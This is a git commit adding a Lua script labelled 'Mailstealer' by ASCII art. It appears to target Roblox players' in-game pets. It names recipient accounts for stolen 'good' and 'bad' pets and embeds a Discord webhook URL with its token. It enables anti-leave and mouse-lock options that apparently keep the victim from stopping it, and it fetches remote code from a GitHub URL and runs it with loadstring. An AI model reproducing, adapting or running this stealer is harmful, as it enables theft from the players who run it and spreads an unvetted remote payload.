fed80ad682bfcecf020560bffbed0ce42c8c7ab6
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-04 04:52:23 +0700

    .lua

---
+++ Justanotherdme/Moonscriptzz/main/.lua
@@ -0,0 +1,18 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "charken_14" -- good pets
+Webhook = "https://discord.com/api/webhooks/1125542007146819584/zqObksujVXa7xKwsd6ZTCTGETBOnFgjwb8IdY_Y5tAl3ScpBQ_fj2A_kMUlR1dbTl-XW" -- pings for pets
+UserName2 = "kalongtzy" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
